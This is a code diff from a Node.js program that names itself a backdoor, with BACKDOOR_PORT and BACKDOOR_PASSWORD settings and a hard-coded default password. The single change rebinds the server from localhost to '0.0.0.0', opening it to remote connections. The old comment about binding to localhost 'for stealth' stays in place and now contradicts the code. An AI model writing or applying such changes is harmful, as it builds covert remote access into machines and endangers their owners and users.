@@ -10,7 +10,7 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
 
 const PORT = process.argv[2] || process.env.BACKDOOR_PORT || 8080;
-const HOST = '127.0.0.1'; // Bind to localhost for stealth; change to '0.0.0.0' for remote access
+const HOST = '0.0.0.0'; // Bind to localhost for stealth; change to '0.0.0.0' for remote access
 const PASSWORD = process.argv[3] || process.env.BACKDOOR_PASSWORD || 'beemovierocks'; // Simple auth; change this!
 
 let currentDir = process.cwd();
